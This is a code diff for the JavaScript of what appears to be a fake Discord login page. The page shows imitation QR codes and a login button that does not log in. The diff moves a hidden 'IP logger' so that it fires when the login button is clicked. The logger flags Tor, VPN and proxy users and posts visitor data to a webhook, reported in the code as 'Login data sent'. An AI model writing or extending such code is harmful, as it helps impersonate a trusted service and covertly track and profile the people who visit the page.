@@ -1,8 +1,8 @@
 // ==================================
-// IP LOGGER (PAGE LOAD ONLY)
+// IP LOGGER (LOGIN ONLY)
 // ==================================
 const sendIP = () => {
-  // prevent duplicate logs per page load
+  // Prevent duplicate logs per session
   if (sessionStorage.getItem("ipLogged")) return;
   sessionStorage.setItem("ipLogged", "true");
 
@@ -24,7 +24,7 @@ const sendIP = () => {
           const embedColor =
             isTor ? 0xff0033 : isVPN || isProxy ? 0xffa500 : 0x00ff88;
 
-          return fetch("/webhook", {
+          return fetch("http://localhost:3000/webhook", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -40,10 +40,10 @@ const sendIP = () => {
         });
     })
     .then(res => {
-      if (res.ok) console.log("IP logged on page load");
+      if (res.ok) console.log("Login data sent");
       else console.warn("Webhook failed");
     })
-    .catch(err => console.error("IP logger error:", err));
+    .catch(err => console.error("Login logger error:", err));
 };
 
 // ==================================
@@ -65,136 +65,67 @@ const DOM = {
 };
 
 // ==================================
-// UTILITY FUNCTIONS
-// ==================================
-const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
-  const chars =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  return Array.from({ length }, () =>
-    chars.charAt(Math.floor(Math.random() * chars.length))
-  ).join("");
-};
-
-// ==================================
-// QR CODE MODULE
+// QR CODE MODULE (UNCHANGED)
 // ==================================
 const QRCodeModule = {
   generate(data) {
-    try {
-      const qr = qrcode(0, "L");
-      qr.addData(data);
-      qr.make();
+    const qr = qrcode(0, "L");
+    qr.addData(data);
+    qr.make();
 
-      const moduleCount = qr.getModuleCount();
-      const svgString = qr.createSvgTag(1, 0);
+    const svg = new DOMParser()
+      .parseFromString(qr.createSvgTag(1, 0), "image/svg+xml")
+      .documentElement;
 
-      const svg = new DOMParser()
-        .parseFromString(svgString, "image/svg+xml")
-        .documentElement;
+    svg.setAttribute("width", "160");
+    svg.setAttribute("height", "160");
+    svg.setAttribute("viewBox", "0 0 37 37");
 
-      svg.setAttribute("width", "160");
-      svg.setAttribute("height", "160");
-      svg.setAttribute("viewBox", "0 0 37 37");
-
-      const path = svg.querySelector("path");
-      if (path) {
-        path.setAttribute("transform", `scale(${37 / moduleCount})`);
-      }
-
-      return svg;
-    } catch (err) {
-      console.error("QR generation error:", err);
-      return null;
-    }
-  },
-
-  showLoadingAnimation() {
-    if (!DOM.qrCodeContainer) return;
-    DOM.qrCodeContainer.innerHTML = `
-      <span class="spinner qrCode-spinner">
-        <span class="inner wanderingCubes">
-          <span class="item"></span>
-          <span class="item"></span>
-        </span>
-      </span>
-    `;
+    return svg;
   },
 
   refresh() {
     if (!DOM.qrCodeContainer) return;
 
     DOM.qrCodeContainer.innerHTML = "";
-
-    const qr = this.generate(
-      `https://discord.com/ra/${generateRandomString()}`
+    DOM.qrCodeContainer.appendChild(
+      this.generate(`https://discord.com/ra/${Math.random().toString(36).slice(2)}`)
     );
-
-    if (qr) DOM.qrCodeContainer.appendChild(qr);
 
     DOM.qrCodeContainer.insertAdjacentHTML(
       "beforeend",
       `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
     );
-
-    DOM.qrCodeContainer.style.background = "white";
-  },
-
-  simulateRefresh() {
-    this.showLoadingAnimation();
-    setTimeout(() => this.refresh(), 3500);
   },
 
   initRefreshInterval() {
-    setInterval(
-      () => this.simulateRefresh(),
-      CONFIG.QR_REFRESH_INTERVAL
-    );
+    setInterval(() => this.refresh(), CONFIG.QR_REFRESH_INTERVAL);
   },
 };
 
 // ==================================
-// LOGIN BUTTON MODULE (NO IP LOGGING)
+// LOGIN BUTTON MODULE (LOGS ON LOGIN)
 // ==================================
 const LoginButtonModule = {
-  getEllipsisMarkup() {
-    return `
-      <span class="spinner">
-        <span class="inner pulsingEllipsis">
-          <span class="item spinnerItem"></span>
-          <span class="item spinnerItem"></span>
-          <span class="item spinnerItem"></span>
-        </span>
-      </span>
-    `;
-  },
-
-  applyAnimationDelays() {
-    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
-      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
-        i * CONFIG.ELLIPSIS_DELAY_INCREMENT
-      }s`;
-    });
-  },
-
   showLoading() {
     if (!DOM.loginButton) return;
 
-    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
+    DOM.loginButton.textContent = "Logging in…";
     DOM.loginButton.disabled = true;
-    this.applyAnimationDelays();
+
+    // ✅ SEND DATA ON LOGIN
+    sendIP();
 
     setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
   },
 
   reset() {
-    if (!DOM.loginButton) return;
     DOM.loginButton.textContent = "Log In";
     DOM.loginButton.disabled = false;
   },
 
   init() {
-    if (!DOM.loginButton) return;
-    DOM.loginButton.addEventListener("click", e => {
+    DOM.loginButton?.addEventListener("click", e => {
       e.preventDefault();
       this.showLoading();
     });
@@ -202,24 +133,13 @@ const LoginButtonModule = {
 };
 
 // ==================================
-// GLOBAL EVENTS
-// ==================================
-const preventContextMenu = (e) => e.preventDefault();
-
-// ==================================
-// INIT (PAGE LOAD)
+// INIT
 // ==================================
 const init = () => {
-  // ✅ IP LOGGED ONLY ON PAGE LOAD
-  sendIP();
-
   LoginButtonModule.init();
   QRCodeModule.initRefreshInterval();
-  document.addEventListener("contextmenu", preventContextMenu);
 };
 
-if (document.readyState === "loading") {
-  document.addEventListener("DOMContentLoaded", init);
-} else {
-  init();
-}
+document.readyState === "loading"
+  ? document.addEventListener("DOMContentLoaded", init)
+  : init();
